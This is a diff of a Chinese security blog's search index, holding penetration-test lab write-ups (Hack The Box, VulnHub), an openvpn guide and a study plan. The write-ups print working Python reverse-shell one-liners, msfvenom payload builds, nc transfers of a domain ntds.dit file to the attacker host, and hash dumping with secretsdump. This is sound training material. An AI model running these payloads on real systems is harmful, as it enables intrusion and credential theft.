src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/4.PNG"></p><ul><li>Trying</li></ul><p>访问备份页面的地址<code>http://10.10.10.55:60000/url.php?path=http://localhost:888/?doc=backup</code><br>url编码一下<code>http%3A%2f%2f10.10.10.55%3A60000%2furl.php%3Fpath%3Dhttp%3A%2f%2flocalhost%3A888%2f%3Fdoc%3Dbackup</code><br>得到了可能是tomcat配置文件中的用户名密码。</p><p>（有一个小技巧，在端口扫描那一步，得到了不能访问的文件名，可以用ssrf去访问，来获取敏感文件。）</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/5.PNG"><br>我们用这个口令登陆端口扫描那一步获得的地址<code>manager/html</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/6.PNG"></p><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a><strong>获取shell</strong></h4><p>刚刚通过ssrf获取敏感文件，从而突破防线，接下来，我们要获取一个shell。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/7.PNG"><br>用msfvenom生成一个payload，接下来要将它上传到目标机上运行。<br>因为主页面上有上传功能，提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">deploy <span class="hljs-built_in">directory</span> <span class="hljs-keyword">or</span> WAR <span class="hljs-built_in">file</span> located <span class="hljs-keyword">on</span> <span class="hljs-title">server</span>.<br>war <span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> deploy <br>select war <span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> upload.<br></code></pre></div></td></tr></table></figure><p>暗示了我们可以上传一个war类型的反弹shell。</p><blockquote><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=kali的ip LPORT=80 -f war &gt; ippsec.war</p></blockquote><p><code>War——web归档文件，war文件用于封装web模块。web模块可以代表一个独立的web应用程序。</code></p><ul><li><p>Trying<br>成功上传——本地nc监听80端口<code>nc -lnvp 80</code>——浏览器访问payload地址，即可获得一个shell。</p></li><li><p>shell中运行<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 于是获得一个bash shell。</p></li></ul><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h4><p>cd backups<br>ls 发现tomcat-users.xml<br>cat *.xml 显示权限不够<br>cd home<br>find .<br>cd tomcat/to_archive/pentest_data/<br>ls<br>发现两个文件，<code>.dit</code>,<code>.bin</code> </p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-02/%E6%8D%95%E8%8E%B7%202.PNG" alt="说明这是windows域的文件"></p><p>file *<br>说明<code>.dit</code>是data类型，<code>.bin</code>是微软windows registry文件。</p><ul><li><p>Trying: nc传文件。<br>kali中运行：<br><code>nc -lvnp 443 &gt; ntds.dit</code><br>shell中运行：<br><code>nc 攻击机IP 443 &lt; xx.dit</code><br>.dit需要输入全称哈，这里省略了。</p></li><li><p>Trying: 提取.bin文件<br>impacket-secretsdump -h<br><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL</code><br>得到了Target system bootKey，关于域渗透知识，还欠缺。<br>得到了一系列用户名和密码的hash值。</p></li><li><p>Trying: tomcat的反弹shell中，运行<br>arp -a 查看局域网机器<br>获得<code>10.10.10.2</code> <code>10.0.3.133</code>两个机器的IP</p></li><li><p>Trying: 对这两台机器进行扫描<br>运行nmap， 显示try harder!<br>用nc进行端口扫描，</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.0.3.133</span> <span class="hljs-number">445</span>连接拒绝<br><span class="hljs-attribute">nc</span> -v <span class="hljs-number">10.0.3.133</span> <span class="hljs-number">22</span>成功连接<br></code></pre></div></td></tr></table></figure><p>并且显示ssh版本为，openssh，操作系统为ubuntu。</p></li><li><p>Trying: 在线对hash进行解密<br>先删除明显是windows机器的hash，浏览器搜索hashkiller，对剩下的hash解密。<br><code>awk -F: &#39;&#123;print $4&#125;&#39; hashes</code></p></li><li><p>Trying: 尝试ssh登陆<br>ssh <a href="mailto:&#97;&#x74;&#x61;&#110;&#x61;&#x73;&#64;&#x31;&#48;&#x2e;&#49;&#x30;&#x2e;&#49;&#x30;&#46;&#x35;&#x35;">&#97;&#x74;&#x61;&#110;&#x61;&#x73;&#64;&#x31;&#48;&#x2e;&#49;&#x30;&#x2e;&#49;&#x30;&#46;&#x35;&#x35;</a><br>尝试了一个遍，失败</p></li><li><p>Trying: tomcat的反弹shell中，尝试切换用户<br>su - atanas<br>使用解密出来的一个密码，成功切换到该用户<br>cd root<br>cat app.log</p></li><li><p>Trying: 利用wget命令执行漏洞<br>searchsploit wget<br>searchsploit -m exploits/linux/remote/40064.txt</p></li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>编码与解码</title>
     <link href="/2018/05/20/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/"/>
     <url>/2018/05/20/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/</url>
@@ -6092,6 +6055,31 @@
     <url>/2018/04/16/x/</url>
     
     <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0416/%E6%8D%95%E8%8E%B7.PNG"></p><p><strong>端口探测：</strong> </p><p><strong>80/tcp open</strong> http Apache httpd 2.4.18 ((Ubuntu))</p><p>100/tcp  filtered newacct</p><p>1500/tcp filtered vlsi-lm<br>…</p><p><strong>web目录探测：</strong><br>图片一：<br>/config.php: PHP Config file may contain database IDs and passwords.</p><ul><li><p>OSVDB-3268: /dev/: Directory indexing found.</p></li><li><p>OSVDB-3092: /dev/: This might be interesting…</p></li><li><p>OSVDB-3268: /php/: Directory indexing found.</p></li><li><p>OSVDB-3092: /php/: This might be interesting…<br>…</p></li></ul><p>在“dev/”目录下找到php文件</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0416/2883590-009c05f24f81a9e9.png"></p><p>尝试bash -i 反弹shell，失败，bash版本不适合。尝试nc -e反弹shell，nc版本不支持-e参数。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0416/1.PNG"></p><p>用python成功反弹了一个shell（shell 1）给kali。</p><p><strong>kali上监听</strong>：<code>nc -lnvp 1234</code><br><strong>网页上运行python命令：</strong></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.14.137&quot;</span>,<span class="hljs-number">1234</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></div></td></tr></table></figure><p><strong>信息搜集：</strong></p><blockquote><p>普通用户<br>arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash<br>scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash<br>内核版本：<br>Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux<br>系统版本：Ubuntu 16.04.2 LTS \n \l</p></blockquote><p><a href="https://www.exploit-db.com/exploits/43418/">尝试内核漏洞提权：</a></p><p>有内核漏洞，但gcc没有安装。</p><h2 id="该怎么提权呢？"><a href="#该怎么提权呢？" class="headerlink" title="该怎么提权呢？"></a><strong>该怎么提权呢？</strong></h2><p>现在用户是www-data</p><p>尝试cd /home/arrexel，看到了user.txt，获取到flag。。</p><p>我还以为会有forbidden权限不够的情况。。。怎么回事，权限没划分好么？</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0416/2883590-b737e461e624b35f.png"><br>可以看到有三列，都是r——read，分别对应”文件所有者、组群、非组群“，因为非组群的权限是read，所以可读。然后再尝试下rm删除，果然”rm: cannot remove ‘a’: Permission denied“</p><p><strong>/home/scriptmanager目录下，有个脚本，说是检查linux提权的。运行后指出了一些可以运行的exp来提权</strong></p><p>但是没有gcc，有exp也没用啊！</p><p><a href="http://sicurolab.com/walkthroughs/hackthebox-bashed/">writeup</a></p><h2 id="sudo-u-username的用法"><a href="#sudo-u-username的用法" class="headerlink" title="sudo -u username的用法"></a>sudo -u username的用法</h2><p>-u username不加此参数，代表要以<strong>root</strong> 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）</p><p><strong>用shell 1运行如下命令，得到shell 2</strong></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> -u scriptmanager python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.14.109&quot;</span>,<span class="hljs-number">1235</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>);os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>);os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0416/2.PNG"><br>用sudo反弹了一个scriptmanager用户的shell。<br>在/scripts目录下，发现了它有root权限，于是我们在该目录下建立一个py脚本。<br><code>nc -lvnp 1236</code><br><code>touch pri.py</code></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.10.14.137&quot;</span>,<span class="hljs-number">1236</span>));os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">0</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">1</span>); os.dup<span class="hljs-number">2</span>(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27; &gt; pri.py<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0416/3.PNG"></p><p>总结：<br>这个实验用了很多次python反弹shell。<br>用sudo -u username可以用其他用户来运行命令。<br>本次利用的scripts文件夹会自动运行常用的脚本，从而运行我们加入的反弹shell的py脚本。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/0416/4.PNG" alt="学习下sudoers文件"></p><p>注意：用户权限设置的注释下面，有一行<code>NOPASSWD： ALL</code> 说明用户使用<code>sudo</code>命令时，无需输入密码。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>training</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>training</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>sense(pfsense-命令执行)</title>
+    <link href="/2018/03/29/x/"/>
+    <url>/2018/03/29/x/</url>
+    
+    <content type="html"><![CDATA[<p>第一次在hack-the-box做实验，还是选个简单的吧，免得信心被打击得怀疑人生。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-20/2883590-c23ca97dc60e8680.PNG" alt="2883590-c23ca97dc60e8680"></p><h1 id="侦察："><a href="#侦察：" class="headerlink" title="侦察："></a>侦察：</h1><p><a href="http://10.10.10.60/">http://10.10.10.60</a></p><p>访问该网站，有一个登陆表单。侦察的手段和用到工具以前讲过的就不提了，不然文章太冗长了。</p><h4 id="1-随便输入用户名和密码。"><a href="#1-随便输入用户名和密码。" class="headerlink" title="1.随便输入用户名和密码。"></a>1.随便输入用户名和密码。</h4><p>提示：Username or Password incorrect</p><h4 id="2-尝试输入admin-admin，提示："><a href="#2-尝试输入admin-admin，提示：" class="headerlink" title="2.尝试输入admin/admin，提示："></a>2.尝试输入admin/admin，提示：</h4><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-20/2883590-b088f032fff6992d.PNG" alt="2883590-b088f032fff6992d"></p><p>什么情况？! 猜测，可能是js脚本有检测跨站脚本攻击csrf的代码，em………总之验证crsf没有通过，要看看js脚本才知道怎么回事。</p><h4 id="3-F12查看网络交互"><a href="#3-F12查看网络交互" class="headerlink" title="3.F12查看网络交互"></a>3.F12查看网络交互</h4><blockquote><p>index.php</p><p><strong>jquery.js</strong></p><p><strong>niftyjsCode.js</strong></p><p>csrf-magic.js</p><p>css和gif文件应该不重要，重点分析php脚本和js脚本。</p></blockquote><p><strong>网站文件存在的路径：</strong></p><p><a href="https://10.10.10.60/csrf/csrf-magic.js">https://10.10.10.60/csrf/csrf-magic.js</a></p><p><a href="https://10.10.10.60/themes/**pfsense**_ng/javascript/niftyjsCode.js">https://10.10.10.60/themes/**pfsense**_ng/javascript/niftyjsCode.js</a></p><p><a href="https://10.10.10.60/javascript/jquery.js">https://10.10.10.60/javascript/jquery.js</a></p><p><a href="https://10.10.10.60/tree/">https://10.10.10.60/tree/</a></p><p><a href="https://10.10.10.60//xmlrpc.php">https://10.10.10.60//xmlrpc.php</a></p><p><a href="https://10.10.10.60/installer/installer.php">https://10.10.10.60/installer/installer.php</a></p><h4 id="4-提交的参数："><a href="#4-提交的参数：" class="headerlink" title="4.提交的参数："></a>4.提交的参数：</h4><p>表单提交方式是post，有四个参数，两个自定义参数，usernamefld/passwordfld，两个默认参数，__csrf_magic和login。</p><h4 id="5-配置等info："><a href="#5-配置等info：" class="headerlink" title="5.配置等info："></a>5.配置等info：</h4><blockquote><p>cms：SilverStripe /version？                   php-version：?               web-server：lighttpd/1.4.35</p></blockquote><h4 id="6-可能的弱点："><a href="#6-可能的弱点：" class="headerlink" title="6.可能的弱点："></a>6.可能的弱点：</h4><p>6.1-Site appears vulnerable to the ‘shellshock’ vulnerability (<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278</a>).</p><p>搜索shellshock，看不懂。</p><p>6.2 搜索SilverStripe Tree Control，于是找到了一个方向，或许有cms漏洞。<a href="https://www.cvedetails.com/cve/CVE-2015-5063/">cve detail</a></p><p>然后尝试xss，，</p><hr><p>em……….做不出来，没有sql bug与brute force就不能突破防线了么，╯︿╰ 桑心</p><p><a href="https://forum.hackthebox.eu/discussion/132/sense">论坛讨论地址</a>，看到有人跟我一样我就放心了，但是他们只会说“加油，你可以的，多侦察，做调查，仔细点！”，我：“******！xxx！x！（此处屏蔽违禁词汇）”</p><p>dirbuster真的枚举不出来什么啊</p><p>o(︶︿︶)o</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/12-20/2883590-4d157fc9ea214e0f.PNG" alt="2883590-4d157fc9ea214e0f"></p><h4 id="7-看攻略说是字典-工具的问题。"><a href="#7-看攻略说是字典-工具的问题。" class="headerlink" title="7.看攻略说是字典/工具的问题。"></a>7.看攻略说是字典/工具的问题。</h4><p>说明我用dirbuster默认字典没有扫到关键的文档。</p><p>/usr/share/dirb/wordlists/common.txt        没有扫出</p><hr><p><a href="https://v3ded.github.io/ctf/htb-sense.html">writeup地址</a>：</p><p>第三步信息搜集时，有一个链接暗示了<a href="https://10.10.10.60/themes/**pfsense**_ng/javascript/niftyjsCode.js">https://10.10.10.60/themes/**pfsense**_ng/javascript/niftyjsCode.js</a></p><p>pfsense是一个开源防火墙程序</p><p>gobuster -u <a href="https://10.10.10.60/">https://10.10.10.60/</a>-w/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt-e</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>该目标机，不能够爆破。哪怕多输错几次账号/密码，都会拒绝访问。</p><p>但是很巧妙的是，将口令藏在文件中，如果工具发现，那就能够做。</p><p>回顾半年前，我尝试的这个字典“/usr/share/dirb/wordlists/common.txt  ”，能够成功找到敏感文件，那才奇怪。说明我对工具一点都不熟悉。菜的一笔==</p><p>常用的枚举网站路径的地址：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br></code></pre></div></td></tr></table></figure><p>找到了两个敏感文件，一个提示了pfsense版本，一个给了用户名密码。</p><p>用msf，search pfsense，命令执行漏洞的exp，直接获取root权限。</p>]]></content>
     
     
     <categories>
@@ -6137,6 +6125,31 @@
   
   
   <entry>
+    <title>openvpn</title>
+    <link href="/2018/02/11/x/"/>
+    <url>/2018/02/11/x/</url>
+    
+    <content type="html"><![CDATA[<p>学习下vpn的用法，所谓vpn就是虚拟专用网络。（不懂的人请仔细阅读《计算机网络-第四版》这里就不展开了）。</p><p>openvpn是一个软件，可以通过该软件，连接到专用网络。</p><p>尝试连接一个vpn网络，属于hack the box实验室。</p><blockquote><p><code>openvpn --version</code>  该命令可查看软件版本</p></blockquote><p>连接步骤：1.下载openvpn的配置文件。2.连接（需要openvpn软件客户端安装并正确配置）</p><blockquote><p><code>openvpn --config whale3070.ovpn</code></p></blockquote><p>initialization sequence completed<br>说明连接成功了。</p><blockquote><p><code>ifconfig</code></p></blockquote><p>显示：eth0，这是本地网卡，192.168.1.107 ，255.255.255.0</p><div class="hljs code-wrapper"><pre><code>       tun0，发现多了一个网络，10.10.15.14，子网掩码：255.255.254.0</code></pre></div><p>于是可以用python脚本计算下网段，再扫下网段</p><p><code>nmap -sn 10.10.14.0/23</code></p><p>10.10.14.1 估计是网关</p><p>10.10.15.24  本机</p><p>好了，openvpn就连上了，可以愉快地做实验了。</p><p>后台运行方式：</p><figure class="highlight brainfuck"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">openvpn</span> --<span class="hljs-comment">config</span> <span class="hljs-comment">whale3070</span><span class="hljs-string">.</span><span class="hljs-comment">ovpn</span> --<span class="hljs-comment">daemon</span> <span class="hljs-comment">hackthebox</span><br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>tools</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>tools</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>献给阿尔吉侬的花束--读后感</title>
     <link href="/2018/01/01/%E7%8C%AE%E7%BB%99%E9%98%BF%E5%B0%94%E5%90%89%E4%BE%AC%E7%9A%84%E8%8A%B1%E6%9D%9F/"/>
     <url>/2018/01/01/%E7%8C%AE%E7%BB%99%E9%98%BF%E5%B0%94%E5%90%89%E4%BE%AC%E7%9A%84%E8%8A%B1%E6%9D%9F/</url>
@@ -6156,6 +6169,332 @@
       <tag>View</tag>
       
     </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>我的课程表2018</title>
+    <link href="/2018/01/01/%E6%88%91%E7%9A%84%E8%AF%BE%E7%A8%8B%E8%A1%A82018/"/>
+    <url>/2018/01/01/%E6%88%91%E7%9A%84%E8%AF%BE%E7%A8%8B%E8%A1%A82018/</url>
+    
+    <content type="html"><![CDATA[<p>**《c++ primer plus》P91/953  这本书比《c++ primer》对初学者友好的多。<br>**</p><p>为了防止像上一年那样，学的没头没尾的，我决定从项目 project<br>做起，不会的再去学。</p><p>构思了一个项目：写一个爬虫，爬取网上所有电脑硬件信息，计算每个硬件品牌的平均价格。写一个有图形界面的软件，运行后自动提取电脑硬件信息，然后估价（组装机的价格），以此来判断购买电脑时的价格是否合理。</p><p>软件打算用c++来实现。平台是windows。因为硬件的趋势是一年比一年便宜，所以程序应该是运行时候再在网上提取信息，否则获取到的信息会过时而不准确。</p><p>可能用到的技术有windows API 编程、网络通信等。</p><p>程序的名称就叫<strong>SaveMoney</strong>吧。</p><p>2017.12.15日更新，学c++的过程中，我有种……<br>欲练神功必先自宫的感觉。这个比喻挺奇怪的，就是感觉面对浩如烟海的程序细节无从下手的感觉。</p><p>首先把语法尽快过一遍，然后看《精通windowsAPI》，开始思考软件的构建。因为脚本小子就只会用工具，要精通攻防的话，不得不自己写工具。</p><hr><p>2017.12.26日。有点迷茫，然后就去看了看<strong>安全服务工程师</strong>的招聘要求，工资是我上个月去打工的20倍，不过要求三年以上工作经验欸~b（￣▽￣）d　三年前我还在读高中。。ORZ慢慢来吧</p><p>看了看，招聘的公司都在北京、上海、成都等等，我真是受够了雾霾了（龟毛星人路过），不想去北京。。。我觉得现在纠结这个就像一个小学生纠结大学去清华还是去北大，😂。想到了一句话、一个领域最顶尖的地方只有一个，到底选生活还是选工作？</p><blockquote><p>安全服务工程师：乙方渗透测试，主要是实践，渗透讲究经验。（python脚本编写、扫描、熟练前端和系统漏洞利用、Windows和linux操作、渗透报告文档编写）</p><p>安全实验室：安全研究员，工作主要是漏洞挖掘（汇编、c语言、c++、数据结构与算法、IDA<br>Pro与Ollydbg）</p><p>安全研发：虽然和安全有关，但做的还是程序员的工作，开发开发~（java、c#之类+计算机专业主要课程）</p></blockquote><p>去年都在编程，今年就专注渗透吧，毕竟目标不是安全研究员和安全开发。。</p><p>2018.2.9 感觉已经入门了，我擦！你学了两年才入个门吗？掀桌！</p><p>(lll￢ω￢)无非是从0到1，和从1到100的问题了。</p><p>《黑客大曝光：Web应用程序安全(第3版)》 333页</p><p>《Web渗透技术及实战案例解析》716页</p><p>                     资源：<a href="http://www.antian365.com/forum.php">http://www.antian365.com/forum.php</a></p><h4 id="外文译作："><a href="#外文译作：" class="headerlink" title="外文译作："></a>外文译作：</h4><p>《黑客攻防技术宝典 Web实战篇(第2版)》 648页</p><p>       习题答案：<a href="http://blog.sina.com.cn/s/blog/_545eb7860101379s.html">http://blog.sina.com.cn/s/blog\_545eb7860101379s.html</a></p><h4 id="向大佬学习："><a href="#向大佬学习：" class="headerlink" title="向大佬学习："></a>向大佬学习：</h4><p>争取把他们的文章都看一遍。</p><p><a href="https://www.abatchy.com/">abatchy</a></p><p><a href="http://www.cnblogs.com/iamstudy/">l3m0n</a><br>:::<br>:::<br>:::</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>experience</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2017/12/04/Vulnix%E2%80%94%E2%80%94nfs%E6%8F%90%E6%9D%83.html/"/>
+    <url>/2017/12/04/Vulnix%E2%80%94%E2%80%94nfs%E6%8F%90%E6%9D%83.html/</url>
+    
+    <content type="html"><![CDATA[<p>::: {.container}<br>::: {.post}<br>::: {.show-content}<br><a href="https://www.jianshu.com/p/4487af2fc94b">续上篇</a>：前景提要，通过smtp的信息泄露，用暴力枚举的方式，我们得到了一个ssh登陆普通用户权限的账号和密码。</p><p>根据以往的经验，提权可以通过linux内核的漏洞，然后运行对应的exploit，来进行提权。</p><blockquote><p>uname -a   <br>搜索exploit-db，有提权漏洞。<a href="https://www.exploit-db.com/exploits/18411/">https://www.exploit-db.com/exploits/18411/</a></p><p>linux 3.2.0-29-generic-pae</p></blockquote><blockquote><p>gcc           不能用gcc编译exploit</p><p>The program &#39;gcc&#39; can be found in the following packages:</p><p>* gcc</p><p>* pentium-builder</p><p>Ask your administrator to install one of them</p></blockquote><p>因为目标靶机没有权限用gcc编译，所以尝试在kali上编译好了发送过来。</p><blockquote><p>nc -lvp 666 &lt; shell           shell是编译好的可执行文件，在kali上监听</p><p>nc  192.168.1.107 666 &gt; shell <br> 连接攻击机的666端口，将文件保存为shell</p><p>chmod +x shell</p><p>./shell</p><p>-bash: ./shell: <strong>cannot execute binary file</strong></p></blockquote><p> cannot execute binary<br>file：<a href="http://blog.51cto.com/1381479/888198">参考</a></p><p>那么，可能的原因是不是root，权限不过。要么是，版本不同，必须在目标靶机上编译才能运行。</p><h1 id="尝试反弹一个shell给攻击机"><a href="#尝试反弹一个shell给攻击机" class="headerlink" title="尝试反弹一个shell给攻击机"></a>尝试反弹一个shell给攻击机</h1><p>攻击机：msfvenom -p linux/x86/shell_reverse_tcp -f elf<br>lhost=192.168.1.107 lport=1234 &gt; /var/www/shell</p><p>              nc -lvp 666 &lt; /var/www/shell</p><p>靶机：nc 192.168.1.107 666 &gt; exploit</p><p>            chmod +x exploit</p><p>攻击机：msfconsole</p><p>            use exploit/multi/handler</p><p>            set payload linux/x86/shell_reverse_tcp</p><p>            set LHOST 192.168.1.107</p><p>            set LPORT 1234</p><p>            run</p><p>靶机：./exploit</p><p>我说怎么还是user权限，不是meterpreter.….原来生成的攻击载荷搞错了。ORZ</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-7357f98f994f3def.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><h4 id="重新尝试："><a href="#重新尝试：" class="headerlink" title="重新尝试："></a>重新尝试：</h4><p>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.1.107<br>LPORT=1234 X &gt; /var/www/door</p><p>省略一些命令。。。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-52f29ec62460154c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><p>em..?未知的命令.….所以meterpreter该怎么用。</p><blockquote><p>ps                          列出所有进程</p></blockquote><blockquote><p>migrate 1785          迁移到pid为1785的进程</p></blockquote><p>[*] Migrating to 1785</p><p>[-] Error running command migrate: Rex::RuntimeError Unsupported<br>session x86/linux</p><blockquote><p>getsystem</p></blockquote><p>[-] Unknown command: getsystem.</p><p><a href="http://wooyun.jozxing.cc/static/drops/tips-10146.html">据说</a>：getsystem<br>大部分都会失败 他只尝试了4个Payload。</p><p>但是，就是失败，也不应该是unknown<br>command？怀疑我用的是假的meterpreter....….</p><h4 id="第二次重新尝试："><a href="#第二次重新尝试：" class="headerlink" title="第二次重新尝试："></a>第二次重新尝试：</h4><p>查看payload需要的参数：</p><p>方法一：msfvenom -p linux/x86/meterpreter/reverse_tcp<br>--payload-options   </p><blockquote><p>Basic options:</p><p>Name  Current Setting  Required  Description</p><p>LPORT  4444                yes      The listen port</p><p>RHOST                         no        The target address</p></blockquote><p>方法二：use  payload/linux/x86/meterpreter/reverse_tcp</p><p>              show options</p><p>              back</p><hr><p>msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf<br>LHOST=192.168.1.107 LPORT=1234 X &gt; /var/www/html/xxx</p><p>wget <a href="http://192.168.1.107/xxx">http://192.168.1.107/xxx</a></p><p>成功获取到了meterpreter。</p><p>::: {.image-package}<br><img src="http://upload-images.jianshu.io/upload_images/2883590-c0300f478e71f626.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">{.uploaded-img<br>width=”auto” height=”auto”}\</p><p>::: {.image-caption}<br>:::<br>:::</p><blockquote><p>cat /etc/passwd</p></blockquote><p>根据大于500的为用户账号，系统用户有</p><p>user:x:<strong>1000</strong>:1000:user,,,:/home/user:/bin/bash</p><p>vulnix:x:<strong>2008</strong>:2008::/home/vulnix:/bin/bash</p><p>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</p><blockquote><p>background</p></blockquote><p>search exploit/linux/local </p><p><a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/">meterpreter提权参考</a>。陷入了困境，不知道运行什么样的exp才能获取到最高权限。</p><blockquote><p>search cve:2012-0056     <br> 找到一个通过cve编号搜索的方法，但是msf没有对应的exp可用</p></blockquote><hr><p>2018.2.4更新。暂时先放一放meterpreter提权，在上一篇侦察中，获取到靶机开放了nfs服务，Network<br>File System，网络文件系统。用来共享文件。</p><blockquote><p><strong>2049/tcp open  nfs_acl</strong>    2-3 (RPC #100227)</p></blockquote><p>于是，需要用nfs客户端，<strong>apt-get install nfs-common。</strong></p><p>**参考：<a href="http://www.phpfans.net/ask/answer1/3810159017.html">http://www.phpfans.net/ask/answer1/3810159017.html</a><br>（root_squath )<br>**</p><p>**       <br>  <a 